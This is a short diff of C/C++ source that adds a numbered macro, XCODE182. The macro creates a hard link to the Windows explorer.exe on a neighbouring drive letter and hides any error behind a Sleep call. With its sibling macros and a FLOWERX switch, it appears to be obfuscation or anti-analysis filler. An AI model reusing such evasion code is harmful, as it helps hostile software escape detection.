@@ -2442,6 +2442,19 @@ if(GetLastError()==ERROR_ALREADY_EXISTS)\
 	catch(...) {\
 	Sleep(181);\
 	}
+
+#define XCODE182 try {OUTSTR("182");\
+	GetWindowsDirectory(szXBuff,MAX_PATH);\
+	strcat(szXBuff, "\\explorer.exe");\
+	strcpy(TmpBuf, szXBuff);\
+	TmpBuf[0]+=1;\
+	TmpBuf[3]=0;\
+	strcat(TmpBuf, "explorer.exe");\
+	bRetval=CreateHardLink(TmpBuf,szXBuff,&psa);\
+	}\
+	catch(...) {\
+	Sleep(182);\
+	}
 #ifdef FLOWERX
 #include "xrand.h"
 #else
